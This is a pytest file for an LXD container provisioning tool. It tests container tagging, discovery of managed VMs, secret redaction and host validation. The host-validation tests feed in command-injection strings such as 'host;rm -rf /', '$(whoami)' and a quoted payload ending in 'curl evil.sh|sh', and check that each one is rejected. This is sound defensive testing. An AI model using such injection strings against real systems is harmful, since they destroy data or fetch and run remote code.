"""Tests for the LXD execution layer: tagging, discovery and host validation."""

from __future__ import annotations

import json
import subprocess
from unittest.mock import MagicMock

import pytest

from llm.core import proc
from llm.core.errors import LlmError
from llm.provision import exec as lxd_exec


class TestManagedTag:
    """Tests for container tagging and managed-container discovery."""

    def _make_completed(self, returncode=0, stdout=""):
        p = MagicMock()
        p.returncode = returncode
        p.stdout = stdout
        return p

    def test_tag_as_managed_issues_lxc_config_set(self, monkeypatch):
        """_tag_as_managed should run 'lxc config set <container> user.local-llm-managed=true'."""
        calls: list[list] = []

        def _run(cmd, **kwargs):
            calls.append(list(cmd))
            return self._make_completed(0, "")

        monkeypatch.setattr(subprocess, "run", _run)

        from llm.provision.exec import _tag_as_managed

        _tag_as_managed("craft-llm-1")

        config_set_calls = [c for c in calls if "config" in c and "set" in c]
        assert config_set_calls, "Expected an 'lxc config set' call"
        full = " ".join(config_set_calls[0])
        assert "user.local-llm-managed=true" in full

    def test_list_managed_containers_returns_tagged_running(self, monkeypatch):
        """Only Running containers with the managed tag should be returned."""
        import json as _json

        instances = [
            {
                "name": "craft-llm-1",
                "status": "Running",
                "config": {"user.local-llm-managed": "true"},
            },
            {
                "name": "craft-llm-2",
                "status": "Stopped",
                "config": {"user.local-llm-managed": "true"},
            },
            {
                "name": "craft-llm-3",
                "status": "Running",
                "config": {},  # not managed
            },
            {
                "name": "other-container",
                "status": "Running",
                "config": {"user.local-llm-managed": "true"},
            },
        ]

        def _run(cmd, **kwargs):
            p = MagicMock()
            p.returncode = 0
            p.stdout = _json.dumps(instances)
            return p

        monkeypatch.setattr(subprocess, "run", _run)

        from llm.provision.exec import _list_managed_containers

        result = _list_managed_containers()
        # craft-llm-1 is Running + tagged; craft-llm-2 is Stopped; craft-llm-3 not tagged
        # other-container is Running + tagged but also returned (no prefix filter)
        assert "craft-llm-1" in result
        assert "craft-llm-2" not in result, "Stopped containers should be excluded"
        assert "craft-llm-3" not in result, "Untagged containers should be excluded"

    def test_list_managed_containers_empty_when_lxc_fails(self, monkeypatch):
        """If lxc list fails, return an empty list (don't crash)."""

        def _run(cmd, **kwargs):
            p = MagicMock()
            p.returncode = 1
            p.stdout = ""
            return p

        monkeypatch.setattr(subprocess, "run", _run)

        from llm.provision.exec import _list_managed_containers

        result = _list_managed_containers()
        assert result == []


# ── PATH / bin verification tests ────────────────────────────────────────────


class TestRedaction:
    """Credentials must never reach the terminal, even if they reach argv."""

    @pytest.fixture(autouse=True)
    def _isolate_registry(self, monkeypatch):
        """Keep registered secrets from leaking between tests."""
        monkeypatch.setattr("llm.core.proc._SECRET_VALUES", set())

    def test_run_does_not_echo_registered_secrets(self, monkeypatch, capsys):
        proc.register_secrets("sk-or-v1-secretkey")
        monkeypatch.setattr(lxd_exec.subprocess, "run", MagicMock())

        lxd_exec.run(["hermes", "config", "set", "model.api_key", "sk-or-v1-secretkey"])

        captured = capsys.readouterr()
        assert "sk-or-v1-secretkey" not in captured.out
        assert "***" in captured.out

    def test_run_redacts_failure_output(self, monkeypatch, capsys):
        proc.register_secrets("sk-or-v1-secretkey")
        error = subprocess.CalledProcessError(1, ["cmd"], output="used sk-or-v1-secretkey")
        error.stderr = "also sk-or-v1-secretkey"
        monkeypatch.setattr(lxd_exec.subprocess, "run", MagicMock(side_effect=error))

        with pytest.raises(subprocess.CalledProcessError):
            lxd_exec.run(["cmd"])

        assert "sk-or-v1-secretkey" not in capsys.readouterr().out


# ── host validation ──────────────────────────────────────────────────────────


class TestValidateHost:
    """`server_ip` is interpolated into a shell command, so it must be checked."""

    @pytest.mark.parametrize("value", ["192.168.1.50", "10.0.0.5", "::1", "local-llm", "a.b-c.example"])
    def test_accepts_valid_hosts(self, value):
        assert lxd_exec.validate_host(value) == value

    @pytest.mark.parametrize(
        "value",
        ["", "1.2.3.4 evil", "host;rm -rf /", "$(whoami)", "host'name", "host\nname"],
    )
    def test_rejects_shell_unsafe_hosts(self, value):
        with pytest.raises(LlmError, match="not a valid IP address or hostname"):
            lxd_exec.validate_host(value)

    def test_add_hosts_entry_is_idempotent_and_validated(self, monkeypatch):
        calls = MagicMock()
        monkeypatch.setattr(lxd_exec.subprocess, "run", calls)

        lxd_exec.add_hosts_entry("dev", "192.168.1.50", "local-llm")

        script = calls.call_args.args[0][-1]
        assert "grep -qxF '192.168.1.50 local-llm' /etc/hosts" in script
        assert ">> /etc/hosts" in script

    def test_add_hosts_entry_rejects_injection(self, monkeypatch):
        calls = MagicMock()
        monkeypatch.setattr(lxd_exec.subprocess, "run", calls)

        with pytest.raises(LlmError, match="not a valid IP address or hostname"):
            lxd_exec.add_hosts_entry("dev", "1.2.3.4' /etc/hosts; curl evil.sh|sh #", "local-llm")

        calls.assert_not_called()


# ── managed VM kinds ─────────────────────────────────────────────────────────


def _instance(name: str, *, kind: str | None = None, managed: bool = True, status: str = "Running"):
    """Build an entry shaped like one element of `lxc list --format=json`."""
    config: dict[str, str] = {}
    if managed:
        config[lxd_exec._MANAGED_TAG] = "true"
    if kind is not None:
        config[lxd_exec._KIND_TAG] = kind
    return {"name": name, "status": status, "config": config}


class TestContainerKind:
    """`llm client refresh` must never reconfigure the Hermes VM as a dev client."""

    def test_reads_the_kind_tag(self):
        assert lxd_exec._container_kind(_instance("dev", kind="client")) == lxd_exec.KIND_CLIENT
        assert lxd_exec._container_kind(_instance("hermes", kind="hermes")) == lxd_exec.KIND_HERMES

    def test_untagged_vm_defaults_to_client(self):
        """VMs created before the kind tag existed are dev clients."""
        assert lxd_exec._container_kind(_instance("dev")) == lxd_exec.KIND_CLIENT

    def test_untagged_hermes_is_recognised_by_its_reserved_name(self):
        """An existing Hermes VM predating the tag must still be excluded."""
        assert lxd_exec._container_kind(_instance("hermes")) == lxd_exec.KIND_HERMES

    def test_tag_as_managed_records_the_kind(self, monkeypatch):
        calls = MagicMock()
        monkeypatch.setattr(lxd_exec, "run", calls)

        lxd_exec._tag_as_managed("hermes", lxd_exec.KIND_HERMES)

        set_args = [" ".join(c.args[0]) for c in calls.call_args_list]
        assert any("user.local-llm-managed=true" in a for a in set_args)
        assert any("user.local-llm-kind=hermes" in a for a in set_args)

    def test_tag_as_managed_defaults_to_client(self, monkeypatch):
        calls = MagicMock()
        monkeypatch.setattr(lxd_exec, "run", calls)

        lxd_exec._tag_as_managed("dev")

        assert any("user.local-llm-kind=client" in " ".join(c.args[0]) for c in calls.call_args_list)


class TestListManagedContainers:
    """Discovery must separate dev clients from the Hermes agent VM."""

    def _stub_list(self, monkeypatch, instances):
        monkeypatch.setattr(
            lxd_exec,
            "run_capture",
            MagicMock(return_value=MagicMock(returncode=0, stdout=json.dumps(instances))),
        )

    def test_excludes_hermes_from_client_discovery(self, monkeypatch):
        self._stub_list(
            monkeypatch,
            [_instance("dev", kind="client"), _instance("hermes", kind="hermes")],
        )
        assert lxd_exec._list_managed_containers() == ["dev"]

    def test_kind_none_returns_every_managed_vm(self, monkeypatch):
        self._stub_list(
            monkeypatch,
            [_instance("dev", kind="client"), _instance("hermes", kind="hermes")],
        )
        assert lxd_exec._list_managed_containers(kind=None) == ["dev", "hermes"]

    def test_ignores_untagged_and_stopped_instances(self, monkeypatch):
        self._stub_list(
            monkeypatch,
            [
                _instance("other", managed=False),
                _instance("stopped", kind="client", status="Stopped"),
                _instance("dev", kind="client"),
            ],
        )
        assert lxd_exec._list_managed_containers() == ["dev"]
